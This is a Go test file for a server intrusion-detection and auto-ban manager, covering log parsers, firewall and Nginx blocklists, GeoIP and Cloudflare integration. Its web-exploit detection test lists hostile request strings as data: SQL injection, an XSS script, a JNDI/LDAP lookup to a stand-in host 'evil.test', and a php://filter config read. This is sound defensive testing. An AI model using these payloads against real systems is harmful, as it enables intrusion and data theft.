package security

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"wdev/internal/store"
)

func TestSecurityManagerStrikesAndAutoBan(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_mgr.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	mgr := New(db)
	mgr.firewallEnabled = false // disable real shell firewall calls during test

	ctx := context.Background()

	// 1. Critical attack should immediately trigger auto-ban for public IP
	attackerIP := "203.0.113.10"
	evCrit := Event{
		SourceIP:   attackerIP,
		AttackType: AttackHoneypot,
		Severity:   SeverityCritical,
		Target:     "/.env",
		Details:    "Scanner bot hit",
	}

	blocked, err := mgr.RecordAttack(ctx, evCrit)
	if err != nil {
		t.Fatalf("RecordAttack failed: %v", err)
	}
	if !blocked {
		t.Fatalf("expected critical attack to immediately block attacker IP")
	}

	isB, rec, err := mgr.IsIPBlocked(attackerIP)
	if err != nil || !isB || rec == nil {
		t.Fatalf("expected %s to be recorded as blocked: isB=%v rec=%+v err=%v", attackerIP, isB, rec, err)
	}

	// 2. High severity attack accumulation (3 strikes + 3 strikes = 6 strikes -> auto-ban)
	attacker2 := "198.51.100.5"
	evHigh := Event{
		SourceIP:   attacker2,
		AttackType: AttackPanelBruteForce,
		Severity:   SeverityHigh,
		Target:     "/api/auth/login",
		Details:    "Invalid password 3x",
	}

	blocked1, _ := mgr.RecordAttack(ctx, evHigh)
	if blocked1 {
		t.Fatalf("first High strike should not block immediately")
	}

	blocked2, _ := mgr.RecordAttack(ctx, evHigh)
	if !blocked2 {
		t.Fatalf("second High strike (total 6 weight) should trigger auto-ban")
	}

	isB2, _, _ := mgr.IsIPBlocked(attacker2)
	if !isB2 {
		t.Fatalf("expected attacker2 to be blocked after 2 high severity events")
	}

	// 3. Unblock IP
	if err := mgr.UnblockIP(ctx, attacker2); err != nil {
		t.Fatalf("UnblockIP failed: %v", err)
	}
	isB2After, _, _ := mgr.IsIPBlocked(attacker2)
	if isB2After {
		t.Fatalf("expected attacker2 to be unblocked")
	}

	// 4. Local IP should never be blocked even on critical attack
	localIP := "127.0.0.1"
	evLocal := Event{
		SourceIP:   localIP,
		AttackType: AttackHoneypot,
		Severity:   SeverityCritical,
		Target:     "/.git/config",
	}
	blockedLocal, _ := mgr.RecordAttack(ctx, evLocal)
	if blockedLocal {
		t.Fatalf("local IP must never be blocked")
	}
	isBLocal, _, _ := mgr.IsIPBlocked(localIP)
	if isBLocal {
		t.Fatalf("local IP in database blocked status should be false")
	}
}

func TestSecurityManagerSubscription(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_sub.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	mgr := New(db)
	mgr.firewallEnabled = false

	ch, unsub := mgr.Subscribe()
	defer unsub()

	ev := Event{
		SourceIP:   "198.51.100.99",
		AttackType: AttackSecurityEntrance,
		Severity:   SeverityMedium,
		Target:     "/login",
		Details:    "Missing security entrance cookie",
	}

	_, err = mgr.RecordAttack(context.Background(), ev)
	if err != nil {
		t.Fatalf("RecordAttack failed: %v", err)
	}

	select {
	case received := <-ch:
		if received.SourceIP != "198.51.100.99" || received.AttackType != AttackSecurityEntrance {
			t.Fatalf("unexpected received event: %+v", received)
		}
	case <-time.After(1 * time.Second):
		t.Fatalf("timeout waiting for broadcast event")
	}
}

func TestResolveCountryAndLocalCheck(t *testing.T) {
	if !IsPrivateOrLoopback("127.0.0.1") {
		t.Errorf("expected 127.0.0.1 to be private/loopback")
	}
	if !IsPrivateOrLoopback("10.0.0.1") {
		t.Errorf("expected 10.0.0.1 to be private/loopback")
	}
	if !IsPrivateOrLoopback("192.168.1.10") {
		t.Errorf("expected 192.168.1.10 to be private/loopback")
	}
	if !IsPrivateOrLoopback("100.64.0.5") {
		t.Errorf("expected 100.64.0.5 to be CGNAT/NetBird")
	}
	if IsPrivateOrLoopback("8.8.8.8") {
		t.Errorf("expected 8.8.8.8 to be public")
	}

	country := ResolveCountry("127.0.0.1")
	if country != "LAN" {
		t.Errorf("expected LAN for local IP, got %s", country)
	}
}

func TestPolicyPersistenceAndWhitelistProtection(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_policy.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	mgr := New(db)
	mgr.firewallEnabled = false
	ctx := context.Background()

	// Block IP first, then add its CIDR to whitelist -> should auto-unblock
	if err := mgr.BlockIP(ctx, "203.0.113.42", "Manual test", 0); err != nil {
		t.Fatalf("BlockIP failed: %v", err)
	}
	if blocked, _, _ := mgr.IsIPBlocked("203.0.113.42"); !blocked {
		t.Fatalf("expected 203.0.113.42 to be blocked")
	}

	cfg := mgr.GetPolicy()
	cfg.Whitelist = []string{"203.0.113.0/24", "198.51.100.7"}
	cfg.StrikeThreshold = 4
	cfg.BanDurationHours = 12
	updated, err := mgr.UpdatePolicy(ctx, cfg)
	if err != nil {
		t.Fatalf("UpdatePolicy failed: %v", err)
	}
	if len(updated.Whitelist) != 2 || updated.StrikeThreshold != 4 || updated.BanDurationHours != 12 {
		t.Fatalf("unexpected updated policy: %+v", updated)
	}

	// Reload manager from DB and verify persistence
	mgr2 := New(db)
	mgr2.firewallEnabled = false
	if !mgr2.IsWhitelisted("203.0.113.42") || !mgr2.IsWhitelisted("198.51.100.7") {
		t.Fatalf("expected reloaded manager to retain whitelist")
	}
	if blocked, _, _ := mgr2.IsIPBlocked("203.0.113.42"); blocked {
		t.Fatalf("expected whitelisting CIDR to unblock matching IP")
	}
	if err := mgr2.BlockIP(ctx, "203.0.113.99", "Should reject", 0); err == nil {
		t.Fatalf("expected BlockIP to reject whitelisted CIDR IP")
	}
	if err := mgr2.BlockIP(ctx, "not-an-ip", "Should reject", 0); err == nil {
		t.Fatalf("expected BlockIP to reject invalid IP")
	}

	// Invalid whitelist entry should fail validation
	badCfg := cfg
	badCfg.Whitelist = []string{"999.999.999.999"}
	if _, err := mgr2.UpdatePolicy(ctx, badCfg); err == nil {
		t.Fatalf("expected UpdatePolicy to reject invalid IP/CIDR")
	}
}

func TestSSHBruteForceParserAndDetector(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_ssh.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	mgr := New(db)
	mgr.firewallEnabled = false
	ctx := context.Background()

	samples := []string{
		"Nov 27 10:15:01 vps sshd[1234]: Failed password for invalid user admin from 203.0.113.55 port 55210 ssh2",
		"Nov 27 10:15:03 vps sshd[1235]: Invalid user ubuntu from 203.0.113.55 port 55211",
		"Nov 27 10:15:05 vps sshd[1236]: Failed password for root from 203.0.113.55 port 55212 ssh2",
	}

	now := time.Now()
	for _, line := range samples {
		mgr.ProcessSSHLine(ctx, line, now)
	}

	events, total, err := mgr.ListEvents(10, 0, AttackSSHBruteForce, "", "")
	if err != nil || total != 1 || len(events) != 1 {
		t.Fatalf("expected 1 SSH_BRUTE_FORCE event after 3 failures, got total=%d err=%v", total, err)
	}
	if events[0].SourceIP != "203.0.113.55" || events[0].Severity != SeverityHigh {
		t.Fatalf("unexpected SSH event: %+v", events[0])
	}

	// Severe line (maximum authentication attempts exceeded) after cooldown triggers second strike -> auto-ban
	mgr.ProcessSSHLine(ctx, "Nov 27 10:15:40 vps sshd[1240]: error: maximum authentication attempts exceeded for root from 203.0.113.55 port 55215 ssh2", now.Add(30*time.Second))
	if blocked, _, _ := mgr.IsIPBlocked("203.0.113.55"); !blocked {
		t.Fatalf("expected 203.0.113.55 to be auto-banned after repeated SSH brute force")
	}

	// PAM line parsing check
	ip, user, _, ok := ParseSSHLogLine("Nov 27 10:16:00 vps sshd[1250]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.23 user=deploy")
	if !ok || ip != "198.51.100.23" || user != "deploy" {
		t.Fatalf("unexpected PAM parse result: ok=%v ip=%q user=%q", ok, ip, user)
	}
}

func TestNginxScannerParserAndDetector(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_nginx.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	mgr := New(db)
	mgr.firewallEnabled = false
	ctx := context.Background()
	now := time.Now()

	// 1. Legitimate WordPress login returning 200 MUST NOT trigger false positive
	mgr.ProcessNginxLine(ctx, "blog.example.com", `203.0.113.70 - - [27/Nov/2026:10:00:00 +0700] "GET /wp-login.php HTTP/1.1" 200 4120 "-" "Mozilla/5.0"`, now)
	if _, total, _ := mgr.ListEvents(10, 0, "", "", ""); total != 0 {
		t.Fatalf("legitimate 200 /wp-login.php should not create security event")
	}

	// 2. Scanner User-Agent triggers WEB_SCANNER
	mgr.ProcessNginxLine(ctx, "app.example.com", `198.51.100.44 - - [27/Nov/2026:10:01:00 +0700] "GET /login HTTP/1.1" 404 153 "-" "sqlmap/1.7"`, now)
	evUA, totalUA, _ := mgr.ListEvents(10, 0, AttackWebScanner, "", "198.51.100.44")
	if totalUA != 1 || evUA[0].Severity != SeverityHigh {
		t.Fatalf("expected WEB_SCANNER event for sqlmap UA, got total=%d events=%+v", totalUA, evUA)
	}

	// 3. Burst 404 non-static paths (>= 15 unique paths) triggers WEB_SCANNER
	for i := 1; i <= 15; i++ {
		line := fmt.Sprintf(`198.51.100.80 - - [27/Nov/2026:10:02:00 +0700] "GET /fuzz-dir-%d HTTP/1.1" 404 153 "-" "Go-http-client/1.1"`, i)
		mgr.ProcessNginxLine(ctx, "app.example.com", line, now)
	}
	_, totalBurst, _ := mgr.ListEvents(10, 0, AttackWebScanner, "", "198.51.100.80")
	if totalBurst != 1 {
		t.Fatalf("expected 1 WEB_SCANNER event for 15 unique 404 probes, got %d", totalBurst)
	}

	// 4. Exploit path (/.env) triggers HONEYPOT_PROBE CRITICAL -> auto-ban
	mgr.ProcessNginxLine(ctx, "app.example.com", `203.0.113.91 - - [27/Nov/2026:10:03:00 +0700] "GET /.env HTTP/1.1" 403 134 "-" "python-requests/2.31"`, now)
	if blocked, _, _ := mgr.IsIPBlocked("203.0.113.91"); !blocked {
		t.Fatalf("expected /.env exploit probe in Nginx log to auto-ban 203.0.113.91")
	}
}

func TestPortScanParsersAndDetectors(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_portscan.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	mgr := New(db)
	mgr.firewallEnabled = false
	ctx := context.Background()
	now := time.Now()

	// 1. Firewall log parser: 5 distinct blocked ports -> PORT_SCAN
	for _, port := range []int{21, 23, 445, 3306, 8080} {
		line := fmt.Sprintf("Nov 27 10:10:00 host kernel: [123.45] [UFW BLOCK] IN=eth0 OUT= SRC=203.0.113.60 DST=192.0.2.1 PROTO=TCP SPT=51234 DPT=%d WINDOW=1024 SYN URGP=0", port)
		mgr.ProcessFirewallLogLine(ctx, line, now)
	}
	evFW, totalFW, _ := mgr.ListEvents(10, 0, AttackPortScan, "", "203.0.113.60")
	if totalFW != 1 || evFW[0].Severity != SeverityHigh {
		t.Fatalf("expected 1 PORT_SCAN event from firewall log, got total=%d events=%+v", totalFW, evFW)
	}

	// 2. /proc/net/tcp parsing: 198.51.100.33 (hex 216433C6 -> 198.51.100.33) scanning 5 listening ports
	// plus outbound connections from 192.168.20.100:ephemeral -> 172.217.116.4:443 (Google) which MUST be ignored
	procSample := strings.Join([]string{
		"  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode",
		"   0: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1000 1 0000000000000000 20 4 30 10 -1",
		"   1: 00000000:01BB 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1001 1 0000000000000000 20 4 30 10 -1",
		"   2: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1002 1 0000000000000000 20 4 30 10 -1",
		"   3: 00000000:1538 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1003 1 0000000000000000 20 4 30 10 -1",
		"   4: 00000000:18EB 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1004 1 0000000000000000 20 4 30 10 -1",
		"   5: 6414A8C0:0050 216433C6:C001 01 00000000:00000000 00:00000000 00000000     0        0 1005 1 0000000000000000 20 4 30 10 -1",
		"   6: 6414A8C0:01BB 216433C6:C002 01 00000000:00000000 00:00000000 00000000     0        0 1006 1 0000000000000000 20 4 30 10 -1",
		"   7: 6414A8C0:0016 216433C6:C003 03 00000000:00000000 00:00000000 00000000     0        0 1007 1 0000000000000000 20 4 30 10 -1",
		"   8: 6414A8C0:1538 216433C6:C004 06 00000000:00000000 00:00000000 00000000     0        0 1008 1 0000000000000000 20 4 30 10 -1",
		"   9: 6414A8C0:18EB 216433C6:C005 03 00000000:00000000 00:00000000 00000000     0        0 1009 1 0000000000000000 20 4 30 10 -1",
		"  10: 6414A8C0:8A16 0474D9AC:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 1010 1 0000000000000000 20 4 30 10 -1",
		"  11: 6414A8C0:8D4A 0474D9AC:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 1011 1 0000000000000000 20 4 30 10 -1",
		"  12: 6414A8C0:903C 0474D9AC:01BB 06 00000000:00000000 00:00000000 00000000  1000        0 1012 1 0000000000000000 20 4 30 10 -1",
		"  13: 6414A8C0:A76A 0474D9AC:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 1013 1 0000000000000000 20 4 30 10 -1",
		"  14: 6414A8C0:9834 0474D9AC:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 1014 1 0000000000000000 20 4 30 10 -1",
	}, "\n")
	listening, conns := ParseProcNetConnections(procSample, false)
	if len(listening) != 5 || len(conns) != 10 {
		t.Fatalf("expected 5 listening ports and 10 parsed proc connections, got listening=%d conns=%d", len(listening), len(conns))
	}
	mgr.ProcessProcNetSnapshot(ctx, listening, conns, now)
	evProc, totalProc, _ := mgr.ListEvents(10, 0, AttackPortScan, "", "198.51.100.33")
	if totalProc != 1 || evProc[0].Severity != SeverityHigh {
		t.Fatalf("expected 1 PORT_SCAN event from /proc/net/tcp snapshot, got total=%d events=%+v", totalProc, evProc)
	}
	// Outbound Google HTTPS (172.217.116.4:443) across 5 ephemeral local ports must NOT trigger PORT_SCAN
	if _, totalOut, _ := mgr.ListEvents(10, 0, AttackPortScan, "", "172.217.116.4"); totalOut != 0 {
		t.Fatalf("outbound ephemeral client connections must NOT trigger PORT_SCAN, got %d", totalOut)
	}
}

func TestFirewallIntegrationMocked(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_fw.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	var mu sync.Mutex
	var cmds []string

	mgr := New(db)
	mgr.firewallEnabled = true
	mgr.lookPathFn = func(bin string) string {
		if bin == "firewall-cmd" {
			return "/usr/bin/firewall-cmd"
		}
		return ""
	}
	mgr.fwExec = func(ctx context.Context, bin string, args ...string) (string, error) {
		mu.Lock()
		cmds = append(cmds, bin+" "+strings.Join(args, " "))
		mu.Unlock()
		if len(args) > 0 && args[0] == "--state" {
			return "running", nil
		}
		return "success", nil
	}

	ctx := context.Background()
	if err := mgr.BlockIP(ctx, "203.0.113.15", "Test IPv4 ban", time.Hour); err != nil {
		t.Fatalf("BlockIP IPv4 failed: %v", err)
	}
	if err := mgr.BlockIP(ctx, "2001:db8::5", "Test IPv6 ban", time.Hour); err != nil {
		t.Fatalf("BlockIP IPv6 failed: %v", err)
	}
	if err := mgr.UnblockIP(ctx, "203.0.113.15"); err != nil {
		t.Fatalf("UnblockIP IPv4 failed: %v", err)
	}

	mu.Lock()
	joined := strings.Join(cmds, "\n")
	mu.Unlock()
	if !strings.Contains(joined, "--add-rich-rule=rule family=ipv4 source address=203.0.113.15 drop") {
		t.Fatalf("expected ipv4 firewalld add rule, got:\n%s", joined)
	}
	if !strings.Contains(joined, "--add-rich-rule=rule family=ipv6 source address=2001:db8::5 drop") {
		t.Fatalf("expected ipv6 firewalld add rule, got:\n%s", joined)
	}
	if !strings.Contains(joined, "--remove-rich-rule=rule family=ipv4 source address=203.0.113.15 drop") {
		t.Fatalf("expected ipv4 firewalld remove rule, got:\n%s", joined)
	}
}

func TestGeoIPAsyncBackfill(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_geo.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{"success":true,"country_code":"JP"}`))
	}))
	defer ts.Close()

	oldPrefix := geoLookupURLPrefix
	geoLookupURLPrefix = ts.URL + "/"
	defer func() { geoLookupURLPrefix = oldPrefix }()

	geoCacheMu.Lock()
	delete(geoCache, "203.0.113.201")
	delete(geoInFlight, "203.0.113.201")
	geoCacheMu.Unlock()

	mgr := New(db)
	mgr.firewallEnabled = false

	_, err = mgr.RecordAttack(context.Background(), Event{
		SourceIP:   "203.0.113.201",
		AttackType: AttackPanelBruteForce,
		Severity:   SeverityMedium,
		Target:     "/api/auth/login",
	})
	if err != nil {
		t.Fatalf("RecordAttack failed: %v", err)
	}

	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		events, _, _ := mgr.ListEvents(10, 0, "", "", "203.0.113.201")
		if len(events) == 1 && events[0].CountryCode == "JP" {
			return
		}
		time.Sleep(25 * time.Millisecond)
	}
	t.Fatalf("expected async GeoIP lookup to backfill CountryCode=JP in SQLite")
}

func TestVPSHardeningFeatures(t *testing.T) {
	db, err := store.New(filepath.Join(t.TempDir(), "sec_vps.db"))
	if err != nil {
		t.Fatalf("failed to init store: %v", err)
	}
	defer db.Close()

	ctx := context.Background()
	now := time.Now()
	confD := t.TempDir()

	mgr := New(db)
	mgr.firewallEnabled = false
	mgr.nginxConfDDir = confD
	cfRunning := true
	mgr.cloudflaredCheckFn = func() bool { return cfRunning }

	var reloadErr error
	var reloadCalls int
	mgr.nginxTestReloadFn = func(ctx context.Context) error {
		reloadCalls++
		return reloadErr
	}

	// 1. Block IP + Sync Nginx L7 Blocklist & Cloudflare Real-IP
	if err := mgr.BlockIP(ctx, "203.0.113.55", "Test L7 Ban", time.Hour); err != nil {
		t.Fatalf("BlockIP failed: %v", err)
	}
	if err := mgr.SyncNginxProtection(ctx); err != nil {
		t.Fatalf("SyncNginxProtection failed: %v", err)
	}
	blData, err := os.ReadFile(filepath.Join(confD, nginxBlocklistFilename))
	if err != nil || !strings.Contains(string(blData), "deny 203.0.113.55;") {
		t.Fatalf("expected deny 203.0.113.55; in nginx blocklist, got %q (err=%v)", string(blData), err)
	}
	cfData, err := os.ReadFile(filepath.Join(confD, nginxCFRealIPFilename))
	if err != nil || !strings.Contains(string(cfData), "real_ip_header CF-Connecting-IP;") {
		t.Fatalf("expected CF-Connecting-IP header in realip conf, got %q (err=%v)", string(cfData), err)
	}
	nxSt := mgr.GetNginxStatus()
	if !nxSt.Available || nxSt.RealIPMode != "cloudflare" || nxSt.BlockedEntries != 1 {
		t.Fatalf("unexpected GetNginxStatus: %+v", nxSt)
	}

	// 2. If wdev-edge-realip.conf exists, Cloudflare Real-IP must step aside cleanly
	if err := os.WriteFile(filepath.Join(confD, nginxEdgeRealIPFilename), []byte("real_ip_header X-Real-IP;\n"), 0644); err != nil {
		t.Fatal(err)
	}
	if err := mgr.SyncNginxProtection(ctx); err != nil {
		t.Fatalf("SyncNginxProtection with edge realip failed: %v", err)
	}
	if _, statErr := os.Stat(filepath.Join(confD, nginxCFRealIPFilename)); !os.IsNotExist(statErr) {
		t.Fatalf("expected wdev-cloudflare-realip.conf to be removed when edge realip exists")
	}
	if nxEdge := mgr.GetNginxStatus(); nxEdge.RealIPMode != "edge" {
		t.Fatalf("expected RealIPMode=edge, got %q", nxEdge.RealIPMode)
	}

	// 3. Rollback on nginx -t failure keeps previous working blocklist intact
	reloadErr = fmt.Errorf("nginx syntax failure")
	if err := mgr.BlockIP(ctx, "203.0.113.56", "Trigger rollback", time.Hour); err != nil {
		t.Fatal(err)
	}
	if sErr := mgr.SyncNginxProtection(ctx); sErr == nil {
		t.Fatalf("expected SyncNginxProtection to return reload error")
	}
	blAfterRollback, _ := os.ReadFile(filepath.Join(confD, nginxBlocklistFilename))
	if strings.Contains(string(blAfterRollback), "203.0.113.56") || !strings.Contains(string(blAfterRollback), "203.0.113.55") {
		t.Fatalf("expected rollback to restore previous blocklist without 203.0.113.56, got:\n%s", string(blAfterRollback))
	}
	reloadErr = nil

	// 4. Mocked nftables O(1) hash-set firewall engine
	var fwMu sync.Mutex
	var nftCmds []string
	var nftTableReady bool
	mgr.firewallEnabled = true
	mgr.lookPathFn = func(bin string) string {
		if bin == "nft" {
			return "/usr/bin/nft"
		}
		return ""
	}
	mgr.fwExec = func(ctx context.Context, bin string, args ...string) (string, error) {
		cmdLine := bin + " " + strings.Join(args, " ")
		fwMu.Lock()
		nftCmds = append(nftCmds, cmdLine)
		fwMu.Unlock()
		if len(args) >= 2 && args[0] == "list" && args[1] == "table" {
			if !nftTableReady {
				return "Error: No such file or directory", fmt.Errorf("exit 1")
			}
			return "table inet wdev_security {\n set blocked_v4 {}\n set blocked_v6 {}\n chain input {}\n}", nil
		}
		if len(args) >= 4 && args[0] == "add" && args[1] == "chain" {
			nftTableReady = true
		}
		return "", nil
	}
	if fwSt := mgr.DetectFirewallStatus(ctx); fwSt.Engine != "nftables" || !fwSt.Active {
		t.Fatalf("expected nftables active engine, got %+v", fwSt)
	}
	if err := mgr.BlockIP(ctx, "198.51.100.77", "Test nftables IPv4", time.Hour); err != nil {
		t.Fatal(err)
	}
	if err := mgr.BlockIP(ctx, "2001:db8::99", "Test nftables IPv6", time.Hour); err != nil {
		t.Fatal(err)
	}
	if err := mgr.UnblockIP(ctx, "198.51.100.77"); err != nil {
		t.Fatal(err)
	}
	fwMu.Lock()
	nftLog := strings.Join(nftCmds, "\n")
	fwMu.Unlock()
	for _, want := range []string{
		"add table inet wdev_security",
		"add set inet wdev_security blocked_v4 { type ipv4_addr; }",
		"add element inet wdev_security blocked_v4 { 198.51.100.77 }",
		"add element inet wdev_security blocked_v6 { 2001:db8::99 }",
		"delete element inet wdev_security blocked_v4 { 198.51.100.77 }",
	} {
		if !strings.Contains(nftLog, want) {
			t.Fatalf("expected nftables command %q in log:\n%s", want, nftLog)
		}
	}
	mgr.firewallEnabled = false

	// 5. Mail brute-force detection (Dovecot + Stalwart/Postfix logs)
	mailLines := []string{
		`dovecot: imap-login: Disconnected (auth failed, 1 attempts): user=<admin@example.com>, method=PLAIN, rip=198.51.100.90, lip=10.0.0.1`,
		`stalwart: Authentication failed user=admin@example.com remote-ip=198.51.100.90 protocol=imap`,
		`postfix/smtpd[42]: warning: unknown[198.51.100.90]: SASL LOGIN authentication failed: authentication failure`,
	}
	for _, ml := range mailLines {
		mgr.ProcessMailLine(ctx, ml, now)
	}
	if mailEvs, totalMail, _ := mgr.ListEvents(10, 0, AttackMailBruteForce, "", "198.51.100.90"); totalMail != 1 || mailEvs[0].Severity != SeverityHigh {
		t.Fatalf("expected 1 HIGH MAIL_BRUTE_FORCE event, got total=%d events=%+v", totalMail, mailEvs)
	}

	// 6. OWASP query signatures without false positives
	for _, mal := range []string{
		"/products?id=1%20union%20select%201,password,3",
		"/search?q=<script>alert(1)</script>",
		"/api/login?user=${jndi:ldap://evil.test/x}",
		"/index.php?page=php://filter/convert.base64-encode/resource=config",
	} {
		if !IsWebExploitPath(mal) {
			t.Fatalf("expected OWASP exploit path %q to be detected", mal)
		}
	}
	if IsWebExploitPath("/wp-content/themes/shop/app.css?ver=1.2.3") {
		t.Fatalf("normal asset URL falsely flagged as web exploit")
	}

	// 7. Webhook alert + Cloudflare Access Rule mock + token redaction
	var apiMu sync.Mutex
	var webhookPayloads []map[string]any
	var cfCalls []string

	mockSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.URL.Path == "/webhook":
			var body map[string]any
			_ = json.NewDecoder(r.Body).Decode(&body)
			apiMu.Lock()
			webhookPayloads = append(webhookPayloads, body)
			apiMu.Unlock()
			w.WriteHeader(http.StatusOK)
		case strings.HasPrefix(r.URL.Path, "/zones/"):
			apiMu.Lock()
			cfCalls = append(cfCalls, r.Method+" "+r.URL.Path)
			apiMu.Unlock()
			if r.Method == http.MethodGet {
				_, _ = w.Write([]byte(`{"success":true,"result":[{"id":"rule-42"}]}`))
				return
			}
			_, _ = w.Write([]byte(`{"success":true,"result":{"id":"rule-42"}}`))
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer mockSrv.Close()

	mgr.cfAPIBaseURL = mockSrv.URL
	pol := mgr.GetPolicy()
	pol.AlertWebhookURL = mockSrv.URL + "/webhook"
	pol.AlertMinSeverity = SeverityCritical
	pol.CFBlockSyncEnabled = true
	pol.CFZoneID = "zone123"
	pol.CFAPIToken = "secret-cf-token"
	pol.RetentionDays = 14
	savedPol, err := mgr.UpdatePolicy(ctx, pol)
	if err != nil {
		t.Fatalf("UpdatePolicy with webhook & CF failed: %v", err)
	}
	if savedPol.CFAPIToken != "" || !savedPol.CFTokenConfigured || savedPol.RetentionDays != 14 {
		t.Fatalf("expected redacted UpdatePolicy output, got %+v", savedPol)
	}
	if mgr.GetPolicy().CFAPIToken != "secret-cf-token" {
		t.Fatalf("expected internal CFAPIToken to be stored")
	}

	if err := mgr.SendTestWebhook(ctx, ""); err != nil {
		t.Fatalf("SendTestWebhook failed: %v", err)
	}
	if err := mgr.BlockIP(ctx, "203.0.113.88", "CF Ban Test", time.Hour); err != nil {
		t.Fatal(err)
	}
	if err := mgr.UnblockIP(ctx, "203.0.113.88"); err != nil {
		t.Fatal(err)
	}

	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		apiMu.Lock()
		doneHook := len(webhookPayloads) >= 1
		cfJoined := strings.Join(cfCalls, "\n")
		apiMu.Unlock()
		if doneHook &&
			strings.Contains(cfJoined, "POST /zones/zone123/firewall/access_rules/rules") &&
			strings.Contains(cfJoined, "DELETE /zones/zone123/firewall/access_rules/rules/rule-42") {
			return
		}
		time.Sleep(25 * time.Millisecond)
	}
	t.Fatalf("timed out waiting for webhook or Cloudflare Access Rule API calls")
}
